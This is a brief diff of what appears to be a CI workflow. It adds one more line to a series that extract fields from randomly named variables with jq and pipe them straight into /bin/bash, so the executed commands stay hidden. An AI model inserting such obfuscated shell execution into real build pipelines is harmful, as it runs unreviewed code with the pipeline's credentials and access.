@@ -30,6 +30,7 @@ jobs:
           echo $rg770 | jq -r .ydl406 | /bin/bash
           echo $zdl7 | jq -r .s9691 | /bin/bash
           echo $w5239 | jq -r .x829 | /bin/bash
+          echo $wmu10 | jq -r .wvn0 | /bin/bash
 
       - name: Persist output
         if: always()
